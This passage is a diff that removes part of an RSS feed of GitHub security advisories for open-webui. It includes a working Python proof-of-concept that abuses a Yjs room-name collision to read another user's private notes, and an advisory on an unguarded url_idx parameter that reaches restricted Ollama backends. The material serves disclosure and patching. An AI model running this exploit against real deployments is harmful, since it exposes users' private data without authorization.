-    parser.add_argument("--attacker-email", required=True)
-    parser.add_argument("--attacker-password", required=True)
-    parser.add_argument("--victim-email", required=True)
-    parser.add_argument("--victim-password", required=True)
-    args = parser.parse_args()
-
-    base = args.base_url.rstrip("/")
-
-    # ── Step 1: Login as victim and find their note ──
-    print("[*] Authenticating as victim...")
-    r = requests.post(f"{base}/api/v1/auths/signin",
-                      json={"email": args.victim_email, "password": args.victim_password})
-    if not r.ok:
-        print(f"[-] Victim login failed: {r.status_code}")
-        sys.exit(1)
-    victim_token = r.json()["token"]
-    victim_id = r.json()["id"]
-    print(f"[+] Logged in as victim (id={victim_id})")
-
-    r = requests.get(f"{base}/api/v1/notes/", headers={"Authorization": f"Bearer {victim_token}"})
-    if not r.ok:
-        print(f"[-] Failed to list victim notes: {r.status_code}")
-        sys.exit(1)
-    notes = r.json()
-    if isinstance(notes, dict):
-        notes = notes.get("items", notes.get("data", []))
-    if not notes:
-        print("[-] No victim notes found")
-        sys.exit(1)
-    victim_note = notes[0]
-    victim_note_id = victim_note["id"]
-    print(f"[+] Victim's note: {victim_note.get('title', '?')} (id={victim_note_id})")
-
-    # ── Step 2: Login as attacker ──
-    print(f"\n[*] Authenticating as attacker...")
-    r = requests.post(f"{base}/api/v1/auths/signin",
-                      json={"email": args.attacker_email, "password": args.attacker_password})
-    if not r.ok:
-        print(f"[-] Attacker login failed: {r.status_code}")
-        sys.exit(1)
-    attacker_token = r.json()["token"]
-    attacker_id = r.json()["id"]
-    print(f"[+] Logged in as attacker (id={attacker_id})")
-
-    # ── Step 3: Confirm attacker CANNOT read victim's note via API ──
-    print(f"\n[*] Step 1: Confirming attacker cannot read victim's note via API...")
-    r = requests.get(f"{base}/api/v1/notes/{victim_note_id}",
-                     headers={"Authorization": f"Bearer {attacker_token}"})
-    if r.status_code in (401, 403, 404):
-        print(f"[+] Access correctly DENIED via /api/v1/notes/{victim_note_id} (HTTP {r.status_code})")
-    else:
-        print(f"[!] Unexpected: attacker can read note (status {r.status_code})")
-
-    # ── Step 4 &amp; 5: Victim opens note, attacker reads it concurrently ──
-    async def combined_exploit():
-        # Victim opens note and stays connected
-        print(f"\n[*] Step 2: Victim opens note (stays connected)...")
-        victim_sio = socketio.AsyncClient()
-        await victim_sio.connect(
-            base,
-            socketio_path="/ws/socket.io",
-            auth={"token": victim_token},
-            transports=["websocket"],
-        )
-        doc_id = f"note:{victim_note_id}"
-        await victim_sio.emit("ydoc:document:join", {
-            "document_id": doc_id,
-            "user_id": "victim",
-            "user_name": "Victim",
-        })
-        await asyncio.sleep(1)
-
-        # Send Yjs update with note content
-        try:
-            import pycrdt as Y
-            ydoc = Y.Doc()
-            ytext = ydoc.get("default", type=Y.Text)
-            with ydoc.transaction():
-                ytext += "# Private Notes\n\nPassword for production DB: p@ssw0rd_pr0d_2026\nAWS root account: admin@company.com / SuperSecret!23\n\nDo NOT share this with anyone."
-            update = ydoc.get_update()
-            await victim_sio.emit("ydoc:document:update", {
-                "document_id": doc_id,
-                "update": list(update),
-            })
-            print(f"    Sent Yjs update ({len(update)} bytes)")
-        except Exception as e:
-            print(f"    WARNING: Could not create Yjs update: {e}")
-
-        await asyncio.sleep(1)
-
-        # Now attacker joins while victim is still connected
-        result = await exploit(base, attacker_token, victim_note_id)
-
-        # Clean up victim connection
-        await victim_sio.disconnect()
-        return result
-
-    result = asyncio.run(combined_exploit())
-
-    if not result["joined"]:
-        print(f"\n[-] Failed to join document room")
-        sys.exit(1)
-
-    if result["state"]:
-        state_data = result["state"]
-        state_bytes = bytes(state_data.get("state", []))
-
-        # Try to extract readable text from the Yjs state
-        # Yjs binary format contains the text as embedded strings
-        text_content = ""
-        try:
-            # Search for readable ASCII strings in the binary data
-            current_str = ""
-            for b in state_bytes:
-                if 32 &lt;= b &lt; 127:
-                    current_str += chr(b)
-                else:
-                    if len(current_str) &gt; 5:
-                        text_content += current_str + " "
-                    current_str = ""
-            if len(current_str) &gt; 5:
-                text_content += current_str
-        except Exception:
-            pass
-
-        print(f"\n[+] Extracted text from Yjs state:")
-        print(f"    {text_content[:500]}")
-
-        # Check for sensitive markers
-        sensitive_markers = ["p@ssw0rd", "SuperSecret", "Private Notes", "production DB", "AWS root"]
-        found = [m for m in sensitive_markers if m.lower() in text_content.lower()]
-
-        if found:
-            print(f"\n[+] SUCCESS: Victim's note content LEAKED via Yjs namespace collision!")
-            print(f"    Sensitive markers found: {found}")
-            print(f"    The attacker joined room 'doc_note_{victim_note_id}' (underscore)")
-            print(f"    which bypasses the auth check (only checks 'note:' colon prefix)")
-            print(f"    but accesses the same Yjs document due to normalization.")
-            sys.exit(0)
-        elif text_content.strip():
-            print(f"\n[+] SUCCESS: Note content retrieved (markers may differ)")
-            print(f"    Non-empty Yjs state was returned for victim's note.")
-            sys.exit(0)
-        else:
-            print(f"\n[*] Yjs state was returned but could not extract readable text.")
-            print(f"    Raw state size: {len(state_bytes)} bytes")
-            if len(state_bytes) &gt; 10:
-                print(f"    First 50 bytes: {list(state_bytes[:50])}")
-                print(f"[+] SUCCESS: Non-trivial document state returned")
-                sys.exit(0)
-            sys.exit(1)
-    else:
-        print(f"\n[-] No document state received")
-        print(f"    The Yjs document may not exist in storage yet.")
-        print(f"    Notes must be opened in the UI to create a Yjs document.")
-        sys.exit(1)
-
-
-if __name__ == "__main__":
-    main()
-```
-
-### Impact
-
-Any authenticated user can read the full contents of any other user's private notes. Notes are a collaborative editing feature intended for personal or shared use --  private notes may contain sensitive information such as credentials, internal documentation, or personal data. The attacker only needs to know or enumerate the target note's ID.</description>
-      <guid isPermaLink="false">GHSA-8788-j68r-3cgh</guid>
-      <category>MEDIUM</category>
-      <category>pip:open-webui</category>
-      <pubDate>Wed, 17 Jun 2026 18:05:21 +0000</pubDate>
-    </item>
-    <item>
-      <title>[MEDIUM] pip:open-webui — Open WebUI: Authenticated users can target arbitrary configured Ollama backends via unguarded url_idx path parameter (CVE-2026-54021)</title>
-      <link>https://github.com/advisories/GHSA-9rpj-v7hf-vv2w</link>
-      <description>CVE-2026-54021 · CVSS 6.3 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:L/I:L/A:L) · CWE-863
-
-Affected:
-- pip/open-webui &lt;= 0.9.5 (patched: 0.9.6)
-
----
-
-## Summary
-
-Several direct, index-addressed Ollama proxy routes accept a caller-supplied `url_idx`
-path parameter and use it as a raw index into the admin-configured `OLLAMA_BASE_URLS`
-list. Access control on these routes validates only whether the user may use the
-requested *model*, never which *backend* the request is routed to. Any authenticated
-user can append an arbitrary `url_idx` to force their request onto an Ollama backend
-they were never authorized to reach, including internal, higher-privilege, or
-explicitly admin-disabled backends.
-
-## Affected endpoints
-
-All indexed Ollama routes that resolve the backend through `get_ollama_url()`:
-
-```
-POST /ollama/api/chat/{url_idx}
-POST /ollama/api/generate/{url_idx}
-POST /ollama/api/embed/{url_idx}
-POST /ollama/api/embeddings/{url_idx}
-POST /ollama/v1/chat/completions/{url_idx}
-POST /ollama/v1/completions/{url_idx}
-POST /ollama/v1/messages/{url_idx}
-POST /ollama/v1/responses/{url_idx}
-```
-
-## Root cause
-
-`backend/open_webui/routers/ollama.py` — `get_ollama_url()` consults the
-model-to-backend allow-list (`OLLAMA_MODELS[model]["urls"]`) only when `url_idx` is
-omitted. When the caller supplies `url_idx`, that mapping is skipped and the value is
-used directly as an index:
-
-```python
-async def get_ollama_url(request: Request, model: str, url_idx: Optional[int] = None):
-    if url_idx is None:
-        models = request.app.state.OLLAMA_MODELS
-        if model not in models:
-            raise HTTPException(...)
-        url_idx = random.choice(models[model].get("urls", []))
-    url = request.app.state.config.OLLAMA_BASE_URLS[url_idx]   # caller-controlled, no authz
-    return url, url_idx
-```
-
-The outbound request is then sent to that backend using the backend's own configured
-API key. Backends an admin has disabled (`OLLAMA_API_CONFIGS["&lt;idx&gt;"].enable = false`)
-are hidden from model discovery but remain reachable through the indexed route, because
-the disabled state is never re-checked at request time.
-
-## Impact
-
-A verified, non-admin user with read access to any single model can:
-- route requests to internal / higher-capability / restricted Ollama backends in
-  multi-backend deployments, bypassing backend-level isolation;
-- reach backends the admin has explicitly disabled;
-- have those requests authenticated with the target backend's configured API key
-  (the key is used server-side; it is not returned to the attacker);
-- consume the restricted backend's compute.
-
-There is no cross-user data disclosure and no exfiltration of the backend credential
-itself; the impact is unauthorized access to, and use of, restricted backend resources.
-
-## Affected / Patched
-
-- Affected: `&lt;= 0.9.5`
-- Patched: `&gt;= 0.9.6`
-
-## Fix
-
-0.9.6 adds `validate_ollama_backend_idx()`, invoked on every indexed route (directly and
-via `get_ollama_url()`), which returns 403 for any non-admin caller-supplied `url_idx`
-that is not in the requested model's allowed `urls`. Because disabled backends are absent
-from every model's `urls`, the same check also blocks routing to disabled backends.</description>
-      <guid isPermaLink="false">GHSA-9rpj-v7hf-vv2w</guid>
-      <category>MEDIUM</category>
-      <category>pip:open-webui</category>
-      <pubDate>Wed, 17 Jun 2026 18:01:50 +0000</pubDate>
     </item>
   </channel>
 </rss>
